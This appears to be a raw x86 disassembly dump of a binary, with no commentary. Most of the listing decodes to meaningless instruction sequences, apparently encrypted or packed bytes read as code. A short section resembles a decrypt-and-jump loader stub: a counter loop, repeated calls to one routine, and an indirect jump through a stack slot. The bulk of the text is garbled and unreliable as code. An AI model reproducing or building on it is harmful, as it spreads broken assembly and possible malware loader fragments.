xchg ebx eax
add eax [ ebx ]
sbb dl [ 0xffffffff93939327 ]
add edi ebx
push esp
salc
jae r-xdata
xchg [ ebx - 0x3732336d ] dl
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx - 0x6f ] bh
rcl [ ebx - 0x6eacef6d ] cl
jpo r-xdata
xchg ebx eax
salc
ja r-xdata
lea edx [ ebx + 0x6c317a93 ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
cli
stc
add al 0xc0
push esp
salc
jg r-xdata
jpo r-xdata
and esp [ ebx + 0x7b951ac0 ]
cmp [ ebp - 0x7046c6d ] cl
lds esp [ ebx ]
mov [ 0x7f151ac0 ] eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939363 ]
push ds
salc
jae r-xdata
mul ebp
xchg ebx eax
rcl [ ebx - 0x39fcfc6d ] 0x1
sbb [ edi + 0x12 ] bh
jg r-xdata
sti
0xf17a
xchg edi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpo r-xdata
mov ebp 0x18039393
xlat
mov bh 0xbb
jpe r-xdata
inc esi
popfd
xchg ebx eax
mov [ ebx - 0x2ca8ef6d ] ss
adc [ edi - 0x55 ] dl
push ds
salc
jg r-xdata
adc [ ebx + 0x1a030393 ] 0x15
daa
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov [ 0x3039393 ] eax
add eax [ ebx ]
test al 0x54
jpe r-xdata
mov al [ ebp - 0xd ]
sbb [ ebx + edi * 2 + 0x18 ] dl
test eax 0xcaca9393
jpe r-xdata
test eax 0x53a09393
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
idiv [ edx + 0x6a ]
mov [ ebx - 0x1c2ae56d ] dl
jpe r-xdata
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x6f ] dl
sti
and ecx [ ss : eax - 0x2ae53b45 ]
out 0x7a eax
jecxz r-xdata
xchg ebx eax
adc [ edi - 0x2d ] dl
loop r-xdata
mov [ ebx + 0x3030393 ] dl
add edi [ edx - 0x78 ]
mov edx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
mov [ edx ] al
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x5e06
jne r-xdata
call sub_403068
xchg ebx eax
insb
jecxz r-xdata
fcom [ ebx + 0x3030393 ]
insb
add al 0x13
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
nop
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
jae r-xdata
nop
nop
0x1aca
fwait
xchg ebx eax
xchg ebx eax
stc
std
sbb [ ecx + 0x7a ] cl
enter 0x93d7 0x93
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x1acaca53 ]
into
imul edi [ edx - 0xb ] 0xffffffce
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add ebx [ esi ]
salc
aaa
jpo r-xdata
xor al 0x93
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
jae r-xdata
mov al [ eax ]
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
call sub_403068
mov [ ebp - 0x4 ] eax
nop
nop
jmp [ ebp - 0x4 ]
call sub_403068
mov eax [ ebp + 0x8 ]
add eax 0x554f
jae r-xdata
rcl [ ebx - 0x63ace96d ] 0x17
dec esi
sub_462f7f
push ds
push [ edi + 0xb7f121f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
rol ch 0xc4
jpe r-xdata
insb
insb
jpe r-xdata
mov edx [ ebx + 0x3030393 ]
adc [ edi - 0xd ] bh
rol ch 0xc4
stc
leave
stc
in eax 0xca
stc
hlt
xchg ebx eax
xchg ebx eax
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
adc ebp [ esi + 0x6c ]
insb
jpe r-xdata
add edi [ ebx + 0x3c ]
rcl [ ebx + 0x3030393 ] 0x1
add eax [ ebx ]
sub_46301f
stc
xchg ecx eax
les edi [ edx - 0x7d ]
fst [ ebx - 0x8effc6d ]
mov bh 0x87
xchg ebx eax
push ds
scasd [ edi ]
nop
adc ah ch
xchg edi eax
xchg ebx eax
pushfd
adc eax 0x9393c58b
adc bh dh
mov bh 0xb7
xchg ebx eax
push ds
xlat
mov bh 0xb7
retn
sub_463088
xchg ebx eax
xchg ebx eax
sti
fsubr [ eax - 0x13 ]
sahf
jpe r-xdata
xlat
mov [ ebx + 0x3030393 ] dl
add eax [ ebx ]
add ebx [ esp + 0x5518c353 ]
jpo r-xdata
mov bh 0x87
xchg ebx eax
push ds
scasd [ edi ]
nop
adc ah ch
xchg edi eax
xchg ebx eax
pushfd
adc eax 0x9393c58b
adc bh dh
mov bh 0xb7
xchg ebx eax
push ds
xlat
mov bh 0xb7
retn
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dh bl
fwait
sbb dh dl
outsd
sbb [ edi - 0x6ec985eb ] al
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add esp [ eax + 0x3035053 ]
add eax [ ebx ]
add esi ebp
daa

xchg ebp eax
xchg ebx eax
add eax [ ebx ]
sti
xchg ebx eax
mov [ 0xffffffffe56c9393 ] eax
retn
mov ebp 0xca9393b2
push ss
push ebx
jpe r-xdata
test [ ebx + 0x3030393 ] edx
add eax [ ebx ]
jpo r-xdata
mov bh 0x8f
jpe r-xdata
cmc
sbb al dh
leave
stc
int1
cmc
sbb al dh
int1
jpe r-xdata
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
jpe r-xdata
xchg esi eax
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
jmp r-xdata
sbb bl dh
jno r-xdata
cmc
sub_4630b7
stc
cli
leave
stc
std
cmc
sbb al dh
int 0xc9
stc
div ebp
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
jpe r-xdata
xchg esi eax
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
jmp r-xdata
test [ ebx + 0x3030393 ] edx
add eax [ ebx ]
jpo r-xdata
cmc
sbb al dh
leave
stc
int1
cmc
sbb al dh
int1
jpe r-xdata
cmc
xchg ebx eax
add eax [ ebx ]
sti
xchg ebx eax
mov [ 0xffffffffe56c9393 ] eax
retn
mov ebp 0xca9393b2
push ss
push ebx
jpe r-xdata
mov bh 0x8f
jpe r-xdata
mov bh 0x87
xchg ebx eax
push ds
scasd [ edi ]
nop
adc ah ch
xchg edi eax
xchg ebx eax
pushfd
adc eax 0x9393c58b
adc bh dh
mov bh 0xb7
xchg ebx eax
push ds
xlat
mov bh 0xb7
retn
sbb bl dh
jno r-xdata
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dh bl
fwait
sbb dh dl
outsd
sbb [ edi - 0x6ec985eb ] al
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add esp [ eax + 0x3035053 ]
add eax [ ebx ]
add esi ebp
sub_463114
fmulp st3
idiv [ edx + 0x33 ]
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx + 0x47 ]
salc
xchg ebx eax
xchg ebx eax
jpe r-xdata
test ah 0x1a
aad 0xb3
jpo r-xdata
mov ecx 0xd61e9393
pop ebx
retn
add eax [ ebx ]
insb
xlat
mov bh 0x83
jpe r-xdata
mov [ ebx - 0x7ffb046d ] dl
mov dl 0x2d
les ebx [ edx ]
aad 0x9b
jpo r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi + edx * 8 + 0x6f ]
stosd [ edi ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dh dl
outsd
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
mov ebx 0x3939392
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
outsd
mov [ ebx + 0x5f6bfb93 ] dl
lodsb [ esi ]
fcmovb st4
sbb dl ch
xchg edi eax
jpe r-xdata
pop ds
mov ss [ ebx + 0x3030393 ]
add eax [ ebx ]
push ds
fisubr [ edi - 0x3e ]
retn
adc [ ebx - 0x78a8ef6d ] 0x16
push ebx
pushfd
pop ss
insd
mov [ ebx + 0x6fee1093 ] dl
xchg edi eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ eax + 0x71179c50 ]
lea edx [ ebx - 0x44853f6d ]
xchg edx eax
xchg ebx eax
nop
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ edi + edx * 8 - 0x49 ]
cmp [ edx + 0x1f ] 0xffffffab
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov [ ebx + 0x179c0393 ] dl
scasb [ edi ]
retn 0x9393
sub_46316d
mov [ ebx - 0x7da1046d ] dl
xchg ecx eax
test ah 0x1a
aad 0xb3
jpo r-xdata
add eax [ ebx ]
insb
xlat
mov bh 0x83
jpe r-xdata
mov [ ebx - 0x7ffb046d ] dl
mov dl 0x2d
les ebx [ edx ]
aad 0x9b
jpo r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi + edx * 8 + 0x6f ]
stosd [ edi ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb dh dl
outsd
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
mov ebx 0x3939392
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push esp
salc
outsd
mov [ ebx + 0x5f6bfb93 ] dl
lodsb [ esi ]
fcmovb st4
sbb dl ch
xchg edi eax
jpe r-xdata
pop ds
mov ss [ ebx + 0x3030393 ]
add eax [ ebx ]
push ds
fisubr [ edi - 0x3e ]
retn
adc [ ebx - 0x78a8ef6d ] 0x16
push ebx
pushfd
pop ss
insd
mov [ ebx + 0x6fee1093 ] dl
xchg edi eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ eax + 0x71179c50 ]
lea edx [ ebx - 0x44853f6d ]
xchg edx eax
xchg ebx eax
nop
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ edi + edx * 8 - 0x49 ]
cmp [ edx + 0x1f ] 0xffffffab
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov [ ebx + 0x179c0393 ] dl
scasb [ edi ]
retn 0x9393
sub_463242
xchg ebx eax
xchg ebx eax
pushfd
pop ss
xor eax 0x1e9393a5
fiadd [ edi + 0x1e ]
salc
aaa
jpo r-xdata
sbb [ ebx ] bl
xchg ebx eax
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
fst [ ebx - 0x77f3856d ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
push ss
imul [ esp + ebp * 2 + 0x6c ]
retn
out 0xb7 eax
xchg [ edx ] ebx
fbstp [ edi - 0x7e3c8545 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
movsd [ edi ] [ esi ]
cmc
sbb ch dh
jpo r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esp + 0x5090d5d0 ]
insb
and edx [ edi + 0x18939392 ]
sbb edx [ ebx + 0x6c939392 ]
stc
cmpsd [ esi ] [ edi ]
cmc
sbb al dh
mov edi 0x79ee1af5
jpe r-xdata
and [ eax + 0x3039393 ] dh
0xd77a
retn 0x9393
sub_463277
sbb dh dl
outsd
sbb dl dh
jpo r-xdata
xchg ebx eax
salc
imul ebx [ edx ] 0xffffffd6
jg r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
stc
cmpsd [ esi ] [ edi ]
cmc
sbb al dh
mov edi 0x79ee1af5
jpe r-xdata
add eax [ ebx ]
add ebx [ esp + 0x5090d5d0 ]
salc
sbb dl dh
arpl [ eax + 0x1a41a053 ] sp
salc
outsd
sbb dh bl
outsd
jpe r-xdata
and [ eax + 0x3039393 ] dh
0xd77a
retn 0x9393
mov [ ebx - 0x1a85fc6d ] ss
mov ch 0x93
xchg ebx eax
add ebx [ eax ]
salc
dec edi
test al 0xd5
cmpsd [ esi ] [ edi ]
jpe r-xdata
insb
and edx [ edi + 0x18939392 ]
sbb edx [ ebx + 0x6c939392 ]
xchg [ ebx + 0x3030393 ] dl
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0xd0
aad 0x90
push eax
out 0xb7 eax
xchg [ edx ] ebx
fbstp [ edi - 0x7e3c8545 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
movsd [ edi ] [ esi ]
cmc
sbb ch dh
jpo r-xdata
fcom [ ebx + 0x3030393 ]
add eax [ ebx ]
nop
inc edx
jpo r-xdata
test al 0xd6
imul ebx [ ecx + edx + 0x6c6c6ebd ] 0x7a
or al 0xc0
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
sub ah [ esi - 0x21e16c6d ]
daa
jpe r-xdata
mov [ ebx - 0x6029576d ] ss
pushfd
pop ss
das
xchg [ ebx + 0x6fd66c93 ] edx
sbb dh dl
outsd
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb dl dh
or ebx 0x1af5e5f9
salc

imul ebp [ esp + ebp * 2 + 0x3 ] 0x3030303
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb dl dh
outsd
cmc
sbb bl dh
0xd61e
sub_463373
sbb [ edi + 0x7a ] bh
mov cl 0x85
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb al [ edi - 0x5c18e55e ]
lahf
push ebp
xlat
mov [ 0x53a05083 ] eax
retn
sub_4633ac
cmc
sbb dl dh
imul edi ecx 0xffffffe0
jpe r-xdata
clc
xlat
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
mov al [ 0xffffffffc46cc565 ]
fist [ esi ]
push ebx
jpe r-xdata
xchg ebx eax
xchg ebx eax
insd
insb
insb
sbb dl ch
cmp [ edx + 0x50 ] 0xffffff87
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ esi + edi * 4 - 0x34 ] ch
enter 0x169c 0x16
test al 0x93
xchg ebx eax
jpe r-xdata
test al 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
jge r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
rol ch 0xf9
xlat
mov al [ 0x1bd61e48 ]
rol bl 0x7a
add al 0xa7
xchg ebx eax
xchg ebx eax
aad 0x83
jpe r-xdata
stc
std
sbb [ ebx - 0xb ] bl
sbb bl dh
arpl dx cx
jpe r-xdata
xchg [ ebx + 0x3030393 ] edx
push edx
xchg ecx eax
les ebx [ eax ]
imul edx [ eax ] 0xb27abe69
mov edx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c788e ]
stc
xchg edi eax
sti
xchg ebx eax
mov [ 0xffffffffba7a9393 ] eax
mov edx [ ebx + 0x3030393 ]
sti
clc
cdq
rcl ecx 0x1
lds ebx [ eax ]
imul edi [ ebx + 0x4f ] 0xffffff8b
xchg ebx eax
xchg ebx eax
adc [ edi - 0x7d ] dl
jpe r-xdata
movsb [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
insb
lds ebx [ ebx - 0x6c2c17f0 ]
pushfd
pop ss
xlat
adc [ ebx - 0x39e0856d ] 0x93
xchg ebx eax
add eax [ ebx ]
adc [ edx - 0x6f ] dl
in eax 0x92
retn 0x9393
xchg ebx eax
xchg ebx eax
cmc
push ss
jpe r-xdata
shr [ ebp + eax + 0x13 ] 0x93
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939353 ]
test al 0x50
pushfd
push ss
cli
0x53a09393 0xe57a
xchg edx eax
retn 0x9393
sub_4634db
xchg ebx eax
pushfd
push ss
outsb
outsd
insb
insb
jpe r-xdata
xchg ebx eax
push ds
out dx al
dec ebx
jpe r-xdata
outsd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6c67 ]
jpo r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
pop edx
push eax
retn
jg r-xdata
lea edx [ ebx - 0x4810e56d ]
adc [ eax ] 0xffffffef
mov bh 0xbf
xchg edx eax
insb
loopne r-xdata
fwait
fcom [ ebx + 0x7acdcc93 ]
pop es
xchg [ ebx + 0x10030393 ] edx
push 0xffffffa2
pushfd
push ss
add eax 0x6c6c6c6b
jecxz r-xdata
mov al [ 0x56cc048 ]
adc edx [ ebx + 0x151a9393 ]
push ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
jg r-xdata
pushfd
push ss
cli
0x53a09393 0xe57a
xchg edx eax
jpe r-xdata
add eax [ ebx ]
sbb dh bl
outsd
jpe r-xdata
jpe r-xdata
test al 0x50
shr [ ebp + eax + 0x13 ] 0x93
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939353 ]
retn 0x9393
add eax [ ebx ]
sti
clc
cdq
rcl ecx 0x1
lds ebx [ eax ]
imul edi [ ebx + 0x4f ] 0xffffff8b
xchg ebx eax
xchg ebx eax
adc [ edi - 0x7d ] dl
jpe r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
sar cl 0x97
sti
xchg ebx eax
mov [ 0x43fb9393 ] eax
xchg edx eax
xchg edx eax
xchg ebx eax
adc eax ebx
sar [ edx - 0x76 ] 0x91
xchg ebx eax
xchg ebx eax
jpo r-xdata
adc [ ebx + 0x3030393 ] 0x53160303
pushfd
pop ss
neg [ ecx - 0x11ef6c6d ]
outsd
xchg ebx eax
pushfd
pop ss
enter 0x9399 0x93
jpe r-xdata
add edx [ esi ]
push ebx
test [ esi + 0x6c ] ebp
stosd [ edi ]
xchg ebx eax
xchg ebx eax
cmc
push ss
jpe r-xdata
in eax 0x92
retn 0x9393
stosb [ edi ]
out dx eax
mov bh 0xa3
pushfd
pop ss
xchg esi eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
cdq
xchg ebx eax
xchg ebx eax
xchg ebx eax
rcl [ ebx + 0x4fc61e93 ] 0x7b
adc [ edx - 0x2f856c6d ] 0x9c
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0xffffffff92e57a53 ]
nop
xchg ebx eax
xchg ebx eax
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx + 0x50 ]
mov esi 0x54c39393
xchg ebx eax
xchg esp eax
xchg ebx eax
xchg edx eax
xchg ebx eax
insb
out 0x73 al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
cmc
sbb al dh
jne r-xdata
sbb bl dh
arpl [ ebx + 0x4a ] di
fst [ ebx + 0x7ad7f993 ]
dec ebp
mov ebx 0x3039393
add eax [ ebx ]
add eax esp
insb
add eax 0x93939327
int3
add eax [ ebx ]
ficom [ ebx - 0x60a8ef6d ]
stc
cmp [ edx - 0x4e ] 0xffffffd5
xchg ebx eax
xchg ebx eax
add edi ebx
add eax [ ebx ]
insb
add eax 0x9393933f
mov edx 0x3039393
add eax [ ebx ]

xlat
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
test eax 0x6c9393d0
out 0x6f al
les edi [ edx - 0x5 ]
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
rol ch 0x7a
dec edx
aam 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
push ds
fist [ ecx - 0x769ac08 ]
pop edx
xchg esi eax
sub [ esi + eax * 4 - 0x6d ] ebp
xchg ebx eax
jpe r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
insb
mov al [ 0x5316d46c ]
jpe r-xdata
outsb
insb
add edi ebx
xchg [ ebx - 0x64dd046d ] dl
xchg edi eax
les ebx [ fs : edx ]
aad 0xd3
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x67 ]
scasd [ edi ]
cdq
mov al 0xcb
sbb dl dh
outsd
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
shr [ ebp - 0x42856c6d ] cl
rcl [ ebx - 0x4fcfc6d ] cl
pop edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
lds edi [ ebx + 0x47 ]
ficom [ ebx - 0x60a8ef6d ]
lds edi [ edx - 0x5 ]
rcl [ ebx + 0x3030393 ] 0x3
adc [ edi - 0x79 ] dl
push ss
push ebx
jpe r-xdata
outsd
insb
insb
add ebx [ eax ]
pop ebx
jpo r-xdata
retn 0x1b7b
xchg ebx eax
xchg ebx eax
insb
out 0x6f al
insb
out 0x77 al
insb
les ecx [ edi - 0x6c52d786 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
retn
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax eax
jpe r-xdata
aam 0x93
xchg ebx eax
sbb cl bh
mov bh 0x87
jpo r-xdata
xchg ebx eax
fist [ ebx - 0x4818936d ]
mov ebx [ eax ]
push ebp
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x7a ] bh
hlt
add eax [ ebx ]
pushfd
push ss
stosb [ edi ]
stosd [ edi ]
xchg ebx eax
xchg ebx eax
int 0x50
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
mov [ ebx + 0x517aca93 ] edx
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
sub_463531
stc
insb
sbb ch dh
imul edi [ edx + 0x6e ] 0xffffffaa
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
push ss
push ebx
pushfd
push ss
rol al 0x1
xchg ebx eax
xchg ebx eax
push ds
out dx al
dec ebx
jpe r-xdata
jpo r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
pop edx
push eax
retn
fwait
fcom [ ebx + 0x7acdcc93 ]
pop es
xchg [ ebx + 0x10030393 ] edx
push 0xffffffa2
pushfd
push ss
add eax 0x6c6c6c6b
jecxz r-xdata
add eax [ ebx ]
sbb dh bl
outsd
jpe r-xdata
jpe r-xdata
add edx [ esi ]
push ebx
pushfd
pop ss
neg [ ecx - 0x11ef6c6d ]
outsd
xchg ebx eax
pushfd
pop ss
enter 0x9399 0x93
jpe r-xdata
test [ esi + 0x6c ] ebp
stosd [ edi ]
mov al [ 0xffffffff92e57a53 ]
nop
xchg ebx eax
xchg ebx eax
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx + 0x50 ]
mov esi 0x54c39393
xchg ebx eax
xchg esp eax
xchg ebx eax
xchg edx eax
xchg ebx eax
insb
out 0x73 al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
cmc
sbb al dh
jne r-xdata
sbb bl dh
arpl [ ebx + 0x4a ] di
fst [ ebx + 0x7ad7f993 ]
dec ebp
mov ebx 0x3039393
add eax [ ebx ]
add eax esp
insb
add eax 0x93939327
int3
xchg ebx eax
xchg ebx eax
cmc
push ss
jpe r-xdata
shr [ ebp + eax + 0x13 ] 0x93
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939353 ]
test al 0x50
pushfd
push ss
cli
0x53a09393 0xe57a
xchg edx eax
retn 0x9393
add eax [ ebx ]
ficom [ ebx - 0x60a8ef6d ]
stc
cmp [ edx - 0x4e ] 0xffffffd5
xchg ebx eax
xchg ebx eax
add edi ebx
add eax [ ebx ]
insb
add eax 0x9393933f
mov edx 0x3039393
add eax [ ebx ]

xlat
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
test eax 0x6c9393d0
out 0x6f al
les edi [ edx - 0x5 ]
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
rol ch 0x7a
dec edx
aam 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
push ds
fist [ ecx - 0x769ac08 ]
pop edx
xchg esi eax
sub [ esi + eax * 4 - 0x6d ] ebp
xchg ebx eax
jpe r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
insb
mov al [ 0x5316d46c ]
jpe r-xdata
outsb
insb
add edi ebx
xchg [ ebx - 0x64dd046d ] dl
xchg edi eax
les ebx [ fs : edx ]
aad 0xd3
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x67 ]
scasd [ edi ]
cdq
mov al 0xcb
sbb dl dh
outsd
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
shr [ ebp - 0x42856c6d ] cl
rcl [ ebx - 0x4fcfc6d ] cl
pop edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
lds edi [ ebx + 0x47 ]
ficom [ ebx - 0x60a8ef6d ]
lds edi [ edx - 0x5 ]
rcl [ ebx + 0x3030393 ] 0x3
adc [ edi - 0x79 ] dl
push ss
push ebx
jpe r-xdata
outsd
insb
insb
add ebx [ eax ]
pop ebx
jpo r-xdata
retn 0x1b7b
xchg ebx eax
xchg ebx eax
insb
out 0x6f al
insb
out 0x77 al
insb
les ecx [ edi - 0x6c52d786 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
retn
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax eax
jpe r-xdata
aam 0x93
xchg ebx eax
sbb cl bh
mov bh 0x87
jpo r-xdata
xchg ebx eax
fist [ ebx - 0x4818936d ]
mov ebx [ eax ]
push ebp
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x7a ] bh
hlt
add eax [ ebx ]
pushfd
push ss
stosb [ edi ]
stosd [ edi ]
xchg ebx eax
xchg ebx eax
int 0x50
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
mov [ ebx + 0x517aca93 ] edx
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
